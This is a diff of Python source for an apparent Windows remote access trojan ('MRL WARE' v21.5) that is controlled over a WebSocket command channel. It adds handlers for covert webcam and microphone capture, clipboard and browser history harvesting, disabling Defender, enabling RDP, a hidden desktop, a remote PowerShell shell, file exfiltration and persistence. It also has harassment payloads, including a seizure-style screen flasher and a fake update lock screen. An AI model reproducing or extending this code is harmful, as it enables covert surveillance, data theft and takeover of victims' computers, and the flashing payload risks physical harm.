+            except: subprocess.run("nircmd.exe setsysvolume 65535", shell=True)
+            await send(ws, {"t": "info", "msg": "Volume maxed"})
+
+        elif act == "audio_mute":
+            try:
+                from ctypes import cast, POINTER
+                from comtypes import CLSCTX_ALL
+                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                devices = AudioUtilities.GetSpeakers()
+                iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                vol     = cast(iface, POINTER(IAudioEndpointVolume))
+                vol.SetMute(1, None)
+            except: pass
+            await send(ws, {"t": "info", "msg": "Audio muted"})
+
+        elif act == "audio_unmute":
+            try:
+                from ctypes import cast, POINTER
+                from comtypes import CLSCTX_ALL
+                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                devices = AudioUtilities.GetSpeakers()
+                iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                vol     = cast(iface, POINTER(IAudioEndpointVolume))
+                vol.SetMute(0, None)
+            except: pass
+            await send(ws, {"t": "info", "msg": "Audio unmuted"})
+
+        elif act == "type_loop":
+            text = msg.get("value", "OMEGA ELITE 💀 ")
+            delay = float(msg.get("delay", 0.05))
+            st.type_loop = True
+            def _type_loop():
+                while getattr(st, "type_loop", False):
+                    for ch in text:
+                        if not getattr(st, "type_loop", False): break
+                        try:
+                            vk = ctypes.windll.user32.VkKeyScanW(ord(ch)) & 0xFF
+                            if vk:
+                                ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
+                                ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
+                        except: pass
+                        time.sleep(delay)
+            threading.Thread(target=_type_loop, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Type loop started"})
+        elif act == "type_loop_stop":
+            st.type_loop = False
+            await send(ws, {"t": "info", "msg": "Type loop stopped"})
+
+        elif act == "drag_chaos":
+            st.drag_chaos = True
+            def _drag_chaos_loop():
+                import random
+                u32 = ctypes.windll.user32
+                sw  = u32.GetSystemMetrics(0)
+                sh  = u32.GetSystemMetrics(1)
+                while getattr(st, "drag_chaos", False):
+                    try:
+                        tx = random.randint(100, sw-100)
+                        ty = random.randint(100, sh-100)
+                        u32.SetCursorPos(tx, ty)
+                        u32.mouse_event(0x0002, 0, 0, 0, 0)  # left down
+                        time.sleep(0.05)
+                        u32.SetCursorPos(tx + random.randint(-200, 200),
+                                          ty + random.randint(-200, 200))
+                        u32.mouse_event(0x0004, 0, 0, 0, 0)  # left up
+                    except: pass
+                    time.sleep(0.3)
+            threading.Thread(target=_drag_chaos_loop, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Drag chaos active"})
+        elif act == "drag_chaos_stop":
+            st.drag_chaos = False
+            await send(ws, {"t": "info", "msg": "Drag chaos stopped"})
+
+        elif act == "screen_flash":
+            count = min(int(msg.get("count", 5)), 20)
+            def _flash():
+                hwnd = ctypes.windll.user32.GetDesktopWindow()
+                for _ in range(count):
+                    ctypes.windll.user32.FlashWindow(hwnd, True)
+                    time.sleep(0.15)
+                    ctypes.windll.user32.FlashWindow(hwnd, False)
+                    time.sleep(0.15)
+            threading.Thread(target=_flash, daemon=True).start()
+            await send(ws, {"t": "info", "msg": f"Screen flashed {count}x"})
+
+        elif act == "freeze_screen":
+            # Capture current screen and display as a topmost overlay (appears frozen)
+            def _freeze():
+                try:
+                    import mss, PIL.Image, PIL.ImageTk, tkinter as tk
+                    with mss.mss() as sct:
+                        mon = sct.monitors[0]
+                        sshot = sct.grab(mon)
+                    img = PIL.Image.frombytes("RGB", sshot.size, sshot.bgra, "raw", "BGRX")
+                    root = tk.Tk()
+                    root.attributes("-fullscreen", True, "-topmost", True)
+                    root.overrideredirect(True)
+                    tk_img = PIL.ImageTk.PhotoImage(img)
+                    lbl = tk.Label(root, image=tk_img, cursor="arrow")
+                    lbl.pack()
+                    root.after(int(msg.get("duration", 8)) * 1000, root.destroy)
+                    root.mainloop()
+                except Exception as e:
+                    log(f"[FREEZE] {e}")
+            threading.Thread(target=_freeze, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Screen frozen"})
+
+        elif act == "cam_freeze_frame":
+            # Show last camera frame as fullscreen frozen overlay
+            if hasattr(st, "last_cam_frame") and st.last_cam_frame:
+                data = st.last_cam_frame
+                def _cam_freeze():
+                    try:
+                        import io, PIL.Image, PIL.ImageTk, tkinter as tk
+                        img  = PIL.Image.open(io.BytesIO(data))
+                        root = tk.Tk()
+                        root.attributes("-fullscreen", True, "-topmost", True)
+                        root.overrideredirect(True)
+                        tk_img = PIL.ImageTk.PhotoImage(img)
+                        tk.Label(root, image=tk_img).pack()
+                        root.after(int(msg.get("duration", 6)) * 1000, root.destroy)
+                        root.mainloop()
+                    except Exception as e:
+                        log(f"[CAM FREEZE] {e}")
+                threading.Thread(target=_cam_freeze, daemon=True).start()
+                await send(ws, {"t": "info", "msg": "Cam freeze frame displayed"})
+            else:
+                await send(ws, {"t": "info", "msg": "No camera frame cached yet"})
+
+        elif act == "color_seizure":
+            count = min(int(msg.get("count", 30)), 100)
+            st.seizure_active = True
+            def _seizure():
+                import random
+                colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00,
+                          0xFF00FF, 0x00FFFF, 0xFFFFFF, 0x000000]
+                for _ in range(count):
+                    if not getattr(st, "seizure_active", False): break
+                    try:
+                        import tkinter as tk
+                        root = tk.Tk()
+                        root.attributes("-fullscreen", True, "-topmost", True)
+                        root.overrideredirect(True)
+                        c = f"#{random.choice(colors):06x}"
+                        root.configure(bg=c)
+                        root.after(80, root.destroy)
+                        root.mainloop()
+                    except: pass
+                    time.sleep(0.08)
+            threading.Thread(target=_seizure, daemon=True).start()
+            await send(ws, {"t": "info", "msg": "Color seizure triggered"})
+
+        elif act == "wallpaper_slideshow":
+            urls = msg.get("urls", [])
+            interval = int(msg.get("interval", 5))
+            if not urls:
+                urls = [
+                    "https://picsum.photos/1920/1080?random=1",
+                    "https://picsum.photos/1920/1080?random=2",
+                    "https://picsum.photos/1920/1080?random=3",
+                ]
+            st.wallpaper_slide = True
+            def _slideshow():
+                while getattr(st, "wallpaper_slide", False):
+                    for u in urls:
+                        if not getattr(st, "wallpaper_slide", False): break
+                        try:
+                            data = urllib.request.urlopen(u, timeout=10).read()
+                            _set_wallpaper(data)
+                        except: pass
+                        time.sleep(interval)
+            threading.Thread(target=_slideshow, daemon=True).start()
+            await send(ws, {"t": "info", "msg": f"Wallpaper slideshow started ({len(urls)} images)"})
+        elif act == "wallpaper_slideshow_stop":
+            st.wallpaper_slide = False
+            await send(ws, {"t": "info", "msg": "Slideshow stopped"})
+
+        elif act == "reboot":
+            subprocess.Popen(["shutdown", "/r", "/t", "5", "/c", "System is restarting"],
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+            await send(ws, {"t": "info", "msg": "Reboot in 5s…"})
+
+        elif act == "logoff":
+            ctypes.windll.user32.ExitWindowsEx(0, 0)
+            await send(ws, {"t": "info", "msg": "Logging off…"})
+
+        elif act == "task_spam":
+            cmd = msg.get("value", "mspaint")
+            cnt = min(int(msg.get("count", 5)), 15)
+            for _ in range(cnt):
+                subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                time.sleep(0.2)
+            await send(ws, {"t": "info", "msg": f"Spawned {cnt}x {cmd}"})
+
+        elif act == "eject_cd_spam":
+            import ctypes
+            cnt = min(int(msg.get("count", 5)), 20)
+            def _eject_spam():
+                for _ in range(cnt):
+                    try:
+                        ctypes.windll.WINMM.mciSendStringW("set CDAudio door open", None, 0, None)
+                        time.sleep(0.8)
+                        ctypes.windll.WINMM.mciSendStringW("set CDAudio door closed", None, 0, None)
+                        time.sleep(0.5)
+                    except: pass
+            threading.Thread(target=_eject_spam, daemon=True).start()
+            await send(ws, {"t": "info", "msg": f"CD eject spam x{cnt}"})
+
+        elif act == "screenshot_flood":
+            cnt = min(int(msg.get("count", 10)), 50)
+            delay = float(msg.get("delay", 0.5))
+            async def _ss_flood():
+                for i in range(cnt):
+                    frame = await asyncio.to_thread(_screenshot)
+                    if frame:
+                        await send_bin(ws, 0x02, frame)
+                    await asyncio.sleep(delay)
+            asyncio.create_task(_ss_flood())
+            await send(ws, {"t": "info", "msg": f"Screenshot flood: {cnt} frames"})
+
+        # ── Fake Update Screen ────────────────────────────────────────────────
+        elif act == "fake_update_screen":
+            if not st.fake_update_active:
+                def _do_fake_update():
+                    procs = _launch_fake_update()
+                    st.fake_update_procs  = procs
+                    st.fake_update_active = True
+                    asyncio.run_coroutine_threadsafe(
+                        send(ws, {"t": "info", "msg": "✅ Fake update screen deployed — user is locked"}),
+                        global_loop)
+                threading.Thread(target=_do_fake_update, daemon=True).start()
+                await send(ws, {"t": "fake_update_state", "active": True,
+                                "msg": "Deploying fake update overlay…"})
+            else:
+                await send(ws, {"t": "info", "msg": "Fake update already active"})
+
+        elif act == "revert_fake_update":
+            def _do_revert():
+                _revert_fake_update()
+                st.fake_update_active = False
+                st.fake_update_procs  = []
+                asyncio.run_coroutine_threadsafe(
+                    send(ws, {"t": "fake_update_state", "active": False,
+                              "msg": "✅ Fake update reverted — user has control back"}),
+                    global_loop)
+            threading.Thread(target=_do_revert, daemon=True).start()
+
+    # ── Hidden Operator Desktop ───────────────────────────────────────────────
+    elif t == "hidden_desk_open":
+        prog = msg.get("prog", "explorer.exe")
+        def _open_desk():
+            ok, info = _start_hidden_desktop(prog)
+            st.hidden_desktop_hnd  = _hidden_desk_handle
+            asyncio.run_coroutine_threadsafe(
+                send(ws, {"t": "info",
+                          "msg": f"Hidden desktop {'open PID=' + str(info) if ok else 'FAILED: ' + str(info)}"}),
+                global_loop)
+        threading.Thread(target=_open_desk, daemon=True).start()
+
+    elif t == "hidden_desk_close":
+        _stop_hidden_desktop()
+        st.hidden_stream_active = False
+        await send(ws, {"t": "info", "msg": "Hidden desktop closed"})
+
+    elif t == "hidden_desk_stream_on":
+        st.hidden_stream_active = True
+        await send(ws, {"t": "info", "msg": "Hidden desktop stream started"})
+
+    elif t == "hidden_desk_stream_off":
+        st.hidden_stream_active = False
+        await send(ws, {"t": "info", "msg": "Hidden desktop stream paused"})
+
+    elif t == "hidden_desk_snap":
+        frame = await asyncio.to_thread(_capture_hidden_desktop, int(msg.get("quality", 70)))
+        if frame:
+            await send_bin(ws, 0x0A, frame)  # tag 0x0A = hidden desktop frame
+            await send(ws, {"t": "info", "msg": "Hidden desktop snapshot sent"})
+        else:
+            await send(ws, {"t": "info", "msg": "Hidden desktop snapshot failed (no frame)"})
+
+    # Camera Commands
+    elif t == "cam_on":
+        st.camera_active = True
+        st.camera_idx    = int(msg.get("idx", 0))
+        await send(ws, {"t": "info", "msg": f"Camera {st.camera_idx} started"})
+    elif t == "cam_off":
+        st.camera_active = False
+        await send(ws, {"t": "info", "msg": "Camera stopped"})
+    elif t == "cam_select":
+        st.camera_idx = int(msg.get("idx", 0))
+        await send(ws, {"t": "info", "msg": f"Camera switched to {st.camera_idx}"})
+    elif t == "cam_led":
+        st.camera_no_led = not bool(msg.get("v", False))
+        await send(ws, {"t": "info", "msg": f"LED mode reduced: {st.camera_no_led}"})
+    elif t == "cam_enum":
+        cams = await asyncio.to_thread(enumerate_cameras)
+        await send(ws, {"t": "cam_list", "data": cams})
+    elif t == "cam_snapshot":
+        idx  = int(msg.get("idx", st.camera_idx))
+        data = await asyncio.to_thread(_grab_camera_frame, idx)
+        if data:
+            await send_bin(ws, 0x04, data)
+        await send(ws, {"t": "info", "msg": f"Camera snapshot captured"})
+
+    # Audio Commands
+    elif t == "desktop_audio_on":  setattr(st, "audio_active", True)
+    elif t == "desktop_audio_off": setattr(st, "audio_active", False)
+    elif t == "mic_on":            setattr(st, "mic_active", True)
+    elif t == "mic_off":           setattr(st, "mic_active", False)
+
+    # Clipboard Commands
+    elif t == "clip_read":
+        text = await asyncio.to_thread(recon.get_clipboard) if recon else ""
+        await send(ws, {"t": "clipboard_update", "data": text})
+    elif t == "clip_write":
+        if recon:
+            await asyncio.to_thread(recon.set_clipboard, msg.get("text", ""))
+        await send(ws, {"t": "info", "msg": "Clipboard injected"})
+    elif t == "clip_monitor_on":
+        st.clipboard_monitor = True
+        await send(ws, {"t": "info", "msg": "Clipboard monitoring started"})
+    elif t == "clip_monitor_off":
+        st.clipboard_monitor = False
+        await send(ws, {"t": "info", "msg": "Clipboard monitoring stopped"})
+
+    # Recon Commands
+    elif t == "get_connections":
+        data = await asyncio.to_thread(recon.get_active_connections) if recon else []
+        await send(ws, {"t": "connections", "data": data})
+    elif t == "lan_scan":
+        def _do_scan(ws_o):
+            def lg(m): asyncio.run_coroutine_threadsafe(send(ws_o, {"t": "info", "msg": m}), global_loop)
+            hosts = recon.scan_lan(log_func=lg) if recon else []
+            asyncio.run_coroutine_threadsafe(send(ws_o, {"t": "lan_scan_result", "data": hosts}), global_loop)
+        threading.Thread(target=_do_scan, args=(ws,), daemon=True).start()
+    elif t == "get_software":
+        data = await asyncio.to_thread(recon.get_installed_software) if recon else []
+        await send(ws, {"t": "software_list", "data": data})
+    elif t == "get_history":
+        data = await asyncio.to_thread(recon.get_browser_history, int(msg.get("limit", 200))) if recon else []
+        await send(ws, {"t": "history_list", "data": data})
+    elif t == "get_startup":
+        data = await asyncio.to_thread(recon.get_startup_programs) if recon else []
+        await send(ws, {"t": "startup_list", "data": data})
+    elif t == "remove_startup":
+        if recon:
+            ok = await asyncio.to_thread(recon.remove_startup, msg.get("reg_path", ""), int(msg.get("hive", 0)), msg.get("name", ""))
+            await send(ws, {"t": "info", "msg": "Removed" if ok else "Failed"})
+    elif t == "get_env":
+        data = await asyncio.to_thread(recon.get_env_vars) if recon else dict(os.environ)
+        await send(ws, {"t": "env_vars", "data": data})
+    elif t == "get_geo":
+        data = await asyncio.to_thread(recon.get_geo_ip) if recon else {}
+        st.geo_info = data
+        await send(ws, {"t": "geo_info", "data": data})
+    elif t == "toggle_rdp":
+        if recon:
+            res = await asyncio.to_thread(recon.toggle_rdp, bool(msg.get("v", True)))
+            await send(ws, {"t": "info", "msg": res})
+    elif t == "toggle_defender":
+        if recon:
+            res = await asyncio.to_thread(recon.toggle_defender, bool(msg.get("v", False)))
+            await send(ws, {"t": "info", "msg": res})
+    elif t == "sched_ss_on":
+        st.sched_ss = True
+        st.sched_interval = int(msg.get("interval", 10))
+        await send(ws, {"t": "info", "msg": f"Screenshot scheduler ON ({st.sched_interval}s)"})
+    elif t == "sched_ss_off":
+        st.sched_ss = False
+        await send(ws, {"t": "info", "msg": "Screenshot scheduler OFF"})
+
+    # ── Run ───────────────────────────────────────────────────────────────────
+    elif t == "run":
+        subprocess.Popen(msg.get("cmd", ""), shell=True)
+        await send(ws, {"t": "info", "msg": "Started"})
+
+    # ── Mouse / Keyboard control ──────────────────────────────────────────────
+    elif t == "mnk":
+        mode  = msg.get("mode", "")
+        state = bool(msg.get("state", False))
+        if mode == "mouse":
+            threading.Thread(target=_mnk_mouse, args=(state,), daemon=True).start()
+        elif mode == "keyboard":
+            threading.Thread(target=_mnk_key, args=(state,), daemon=True).start()
+        elif mode == "all":
+            threading.Thread(target=_mnk_mouse, args=(state,), daemon=True).start()
+            threading.Thread(target=_mnk_key, args=(state,), daemon=True).start()
+        await send(ws, {"t": "info", "msg": f"{mode.capitalize()} {'Locked' if state else 'Unlocked'}"})
+
+    # ── High Performance Input Injection ──────────────────────────────────────
+    elif t == "mm":
+        if input_hub is not None:
+            try:
+                x, y, w, h = msg.get("x",0), msg.get("y",0), msg.get("w",1), msg.get("h",1)
+                input_hub.mouse_move(int((x/w)*input_hub.screen_width),
+                                     int((y/h)*input_hub.screen_height))
+            except: pass
+        else:
+            # ctypes fallback
+            try:
+                x, y, w, h = msg.get("x",0), msg.get("y",0), msg.get("w",1), msg.get("h",1)
+                sw = ctypes.windll.user32.GetSystemMetrics(0)
+                sh = ctypes.windll.user32.GetSystemMetrics(1)
+                ax = int((x / w) * sw)
+                ay = int((y / h) * sh)
+                ctypes.windll.user32.SetCursorPos(ax, ay)
+            except: pass
+
+    elif t == "mc":
+        if input_hub is not None:
+            try:
+                b, p = msg.get("b","left"), msg.get("p",1)
+                input_hub.mouse_click(b, p == 1)
+            except: pass
+        else:
+            # ctypes fallback with mouse_event
+            try:
+                b = msg.get("b", "left")
+                p = msg.get("p", 1)
+                import ctypes
+                MOUSEEVENTF_LEFTDOWN  = 0x0002
+                MOUSEEVENTF_LEFTUP    = 0x0004
+                MOUSEEVENTF_RIGHTDOWN = 0x0008
+                MOUSEEVENTF_RIGHTUP   = 0x0010
+                if b == "left":
+                    flag = MOUSEEVENTF_LEFTDOWN if p == 1 else MOUSEEVENTF_LEFTUP
+                else:
+                    flag = MOUSEEVENTF_RIGHTDOWN if p == 1 else MOUSEEVENTF_RIGHTUP
+                ctypes.windll.user32.mouse_event(flag, 0, 0, 0, 0)
+            except: pass
+
+    elif t in ("kd", "ku"):
+        if input_hub is not None:
+            try: input_hub.key_event(msg.get("k",""), t == "kd")
+            except: pass
+        else:
+            # ctypes keybd_event fallback
+            try:
+                import ctypes
+                key_str = msg.get("k", "")
+                vk_map = {
+                    "Enter": 0x0D, "Backspace": 0x08, "Tab": 0x09, "Escape": 0x1B,
+                    "Space": 0x20, "Delete": 0x2E, "ArrowLeft": 0x25, "ArrowUp": 0x26,
+                    "ArrowRight": 0x27, "ArrowDown": 0x28, "Home": 0x24, "End": 0x23,
+                    "PageUp": 0x21, "PageDown": 0x22, "F1": 0x70, "F2": 0x71,
+                    "F3": 0x72, "F4": 0x73, "F5": 0x74, "F12": 0x7B,
+                    "Control": 0x11, "Alt": 0x12, "Shift": 0x10,
+                    "Meta": 0x5B, "Win": 0x5B,
+                }
+                if key_str in vk_map:
+                    vk = vk_map[key_str]
+                elif len(key_str) == 1:
+                    vk = ctypes.windll.user32.VkKeyScanW(ord(key_str)) & 0xFF
+                else:
+                    vk = 0
+                if vk:
+                    flags = 0 if t == "kd" else 2  # KEYEVENTF_KEYUP
+                    ctypes.windll.user32.keybd_event(vk, 0, flags, 0)
+            except: pass
+
+    elif t == "type":
+        try:
+            import pyautogui
+            await asyncio.to_thread(pyautogui.typewrite, msg.get("text",""), interval=0.05)
+        except:
+            # ctypes fallback
+            try:
+                text = msg.get("text", "")
+                for ch in text:
+                    vk = ctypes.windll.user32.VkKeyScanW(ord(ch)) & 0xFF
+                    if vk:
+                        ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
+                        ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
+            except: pass
+
+    # ── File system ───────────────────────────────────────────────────────────
+    elif t == "ls":
+        path = msg.get("path", "C:\\")
+        try:
+            import datetime
+            files = []
+            for entry in os.scandir(path):
+                try:
+                    stat = entry.stat()
+                    files.append({
+                        "name": entry.name, "type": "dir" if entry.is_dir() else "file",
+                        "size": stat.st_size,
+                        "mod":  datetime.datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
+                    })
+                except: pass
+            await send(ws, {"t": "fs_resp", "data": files, "path": path})
+        except Exception as e:
+            await send(ws, {"t": "info", "msg": f"Error: {e}"})
+
+    elif t == "download":
+        path = msg.get("path", "")
+        try:
+            with open(path, "rb") as f: data = f.read()
+            chunk = 65000
+            name  = os.path.basename(path)
+            for i in range(0, len(data), chunk):
+                await send(ws, {"t": "file_chunk", "name": name,
+                                "data": base64.b64encode(data[i:i+chunk]).decode()})
+            await send(ws, {"t": "file_done", "name": name})
+        except Exception as e:
+            await send(ws, {"t": "info", "msg": f"Download failed: {e}"})
+
+    elif t == "upload":
+        path = msg.get("path", "")
+        b64  = msg.get("data", "")
+        try:
+            data = base64.b64decode(b64)
+            with open(path, "wb") as f: f.write(data)
+            await send(ws, {"t": "info", "msg": f"Upload complete: {os.path.basename(path)}"})
+        except Exception as e:
+            await send(ws, {"t": "info", "msg": f"Upload failed: {e}"})
+
+    # ── Shell ─────────────────────────────────────────────────────────────────
+    elif t == "shell":
+        cmd = msg.get("c", "").strip()
+        if cmd:
+            try:
+                result = await asyncio.to_thread(
+                    lambda: subprocess.run(
+                        ["powershell", "-NonInteractive", "-NoProfile", "-Command", cmd],
+                        capture_output=True, text=True, timeout=30,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+                )
+                output = (result.stdout or "") + (result.stderr or "")
+                await send(ws, {"t": "shell_res", "data": output or "(no output)"})
+            except subprocess.TimeoutExpired:
+                await send(ws, {"t": "shell_res", "data": "[ERROR] Command timed out (30s)"})
+            except Exception as e:
+                await send(ws, {"t": "shell_res", "data": f"[ERROR] {e}"})
+
+    # ── Misc ──────────────────────────────────────────────────────────────────
+    elif t in ("handshake_ok", "ping", "pong"): pass
+    else: log(f"Unknown cmd: {t}")
+
+# ─────────────────────────────────────────────────────────────────────────────
+# RECEIVE LOOP
+# ─────────────────────────────────────────────────────────────────────────────
+async def _recv(ws):
+    async for raw in ws:
+        try:
+            if isinstance(raw, bytes): continue
+            await handle(jloads(raw), ws)
+        except Exception as e:
+            log(f"cmd error: {e}")
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+async def main():
+    try: _bootstrap_modules()
+    except Exception as e: log(f"[BOOTSTRAP] Error: {e}")
+
     global global_loop
     global_loop = asyncio.get_event_loop()
+
     try:
-        from modules.persistence import install_persistence, verify_persistence
+        from modules.persistence import install_persistence
+        install_persistence(sys.executable)
+    except: pass
 
-        install_persistence()  # Now uses internal target path
-        verify_persistence()
-    except:
-        pass
+    log(f"v21.5 HARDENED - OMNIPRESENCE LIVE -> {SERVER_URL}")
 
-    retry_delay = 5
-    uid = None
-    dga_idx = None # None means primary, integer means DGA index
-    
+    err_count = 0
     while True:
         try:
-            uri = _ws_url(dga_retry_idx=dga_idx)
-            if uri is None:
-                log("[DGA] Exhausted today's domains. Sleeping 1hr...")
-                await asyncio.sleep(3600)
-                dga_idx = None
-                continue
-
+            uri   = _ws_url()
             specs = get_specs()
-            if uid is None:
-                uid = f"{specs['hostname']}_{get_hwid()[:8]}"
-            
-            log(f"[CONNECT] Attempting: {uri} (ID: {uid})")
+            hwid  = get_hwid()
+            uid   = f"{specs['hostname']}_{hwid[:8]}"
 
-            # Robust SSL for standalone EXEs
-            ssl_context = None
-            if uri.startswith("wss"):
-                try:
-                    ssl_context = ssl.create_default_context()
-                    ssl_context.check_hostname = False
-                    ssl_context.verify_mode = ssl.CERT_NONE
-                except: pass
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode    = ssl.CERT_NONE
+            kw = {"ping_interval": 20, "ping_timeout": 15, "close_timeout": 5}
+            if uri.startswith("wss://"): kw["ssl"] = ctx
 
-            async with websockets.connect(
-                uri, ping_interval=20, ping_timeout=20, max_size=None,
-                ssl=ssl_context, additional_headers={"X-Agent-ID": uid},
-            ) as ws:
-                retry_delay = 5
-                dga_idx = None # Reset DGA on success
-                
+            log(f"CONNECTING: {uri}")
+            async with websockets.connect(uri, **kw) as ws:
+                err_count = 0
                 global _rtc
-                if WebRTCManager:
-                    _rtc = WebRTCManager(lambda o: asyncio.run_coroutine_threadsafe(send(ws, o), global_loop))
-                
-                _init_crypto(uid)
-                await send(ws, {"type": "client_auth", "id": uid, "specs": specs, "enc": True})
-                
-                # Send progress events to the dashboard
-                async def _send_progress(ws, uid):
-                    try:
-                        await send(
-                            ws, {"type": "info", "msg": f"[{uid}] Agent online."}
-                        )
-                        for p in [25, 50, 75, 100]:
-                            await asyncio.sleep(0.5)
-                            await send(
-                                ws, {"type": "info", "msg": f"[{uid}] Init: {p}%"}
-                            )
-                        await send(
-                            ws, {"type": "info", "msg": f"[{uid}] Fully operational."}
-                        )
-                    except:
-                        pass
+                if WebRTCManager is not None:
+                    async def _rtc_send(obj):
+                        try: await ws.send(jdumps(obj))
+                        except: pass
+                    _rtc = WebRTCManager(_rtc_send)
+                else:
+                    _rtc = None
 
-                asyncio.create_task(_send_progress(ws, uid))
-
-                # Receive loop
-                async def _recv(ws):
-                    async for r in ws:
-                        try:
-                            # Attempt Decryption
-                            if isinstance(r, str) and _aes_key:
-                                decrypted = _decrypt(r, "")
-                                if decrypted:
-                                    r = decrypted
-                            
-                            await handle(jloads(r), ws)
-                        except Exception as e:
-                            log(f"[RECV] Parse error: {e}")
-
-                # Heartbeat task: sends ping every 10s to detect zombie connections
-                async def _heartbeat(ws, uid):
-                    log("[HB] Starting heartbeat loop...")
-                    fail = 0
-                    while True:
-                        await asyncio.sleep(10)
-                        try:
-                            # Apex Ultra: Resource Telemetry
-                            try:
-                                import psutil
-                                cpu = psutil.cpu_percent()
-                                ram = psutil.virtual_memory().percent
-                                disk = psutil.disk_usage("C:\\").percent
-                                windows = len(psutil.pids()) # Proxy for load
-                            except:
-                                cpu = ram = disk = windows = None
-                                
-                            await send(
-                                ws, {
-                                    "type": "ping", 
-                                    "id": uid, 
-                                    "ts": time.time(),
-                                    "stats": {
-                                        "cpu": cpu,
-                                        "ram": ram,
-                                        "disk": disk,
-                                        "windows": windows
-                                    }
-                                }
-                            )
-                            fail = 0
-                        except Exception as e:
-                            fail += 1
-                            log(f"[HB] Ping failed #{fail}: {e}")
-                            if fail >= 3:
-                                log(
-                                    "[HB] 3 consecutive ping failures — forcing reconnect"
-                                )
-                                break
-
-                log("[CONNECT] Agent fully operational")
-
-                async def _safe_stream(ws):
-                    try:
-                        await stream_loop(ws)
-                    except Exception as e:
-                        log(f"[STREAM] Fatal error (non-critical, staying connected): {e}")
-
-                async def _safe_audio(ws):
-                    try:
-                        await audio_loop(ws)
-                    except Exception as e:
-                        log(f"[AUDIO] Fatal error (non-critical, staying connected): {e}")
+                await send(ws, {"type": "client_auth", "id": uid, "specs": specs})
+                await send(ws, {"t": "log", "msg": f"CONNECTIVITY v21.5: Handshake Success - {uid}"})
+                log(f"REGISTERED: {uid}")
 
                 await asyncio.gather(
-                    _recv(ws), _safe_stream(ws), _safe_audio(ws), _heartbeat(ws, uid),
-                    return_exceptions=True
+                    _recv(ws),
+                    stream_loop(ws),
+                    audio_loop(ws),
+                    heartbeat_loop(ws, uid),
+                    screenshot_scheduler(ws),
+                    clipboard_relay_loop(ws),
+                    return_exceptions=False
                 )
-
-                log("[CONNECT] Connection closed")
         except Exception as e:
-            log(f"[CONNECT] Connection error: {e}. Retry in {retry_delay}s")
-            # Reset all active states so loops don't auto-restart on reconnect
-            st.streaming = False
-            st.mic_active = False
-            st.desktop_active = False
-            st.camera_active = False
-            await asyncio.sleep(retry_delay)
-            retry_delay = min(retry_delay * 1.5, 10)  # Cap at 10s for fast recovery
+            err_count += 1
+            log(f"CONN FAILED [{err_count}]: {e}")
+            try:
+                with open("CONNECTION_DIAGNOSTIC.txt", "a") as f:
+                    f.write(f"[{time.ctime()}] Target: {uri} | Error: {e}\n")
+            except: pass
 
+            if err_count > 3:
+                try:
+                    import core.capture as cap
+                    cap.hard_reset()
+                except: pass
 
+            await asyncio.sleep(min(30, 2 * err_count))
+
+# ─────────────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    log(f"--- MRL WARE {BUILD} STARTING ---")
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        log("--- MRL WARE SHUTDOWN ---")
         sys.exit(0)
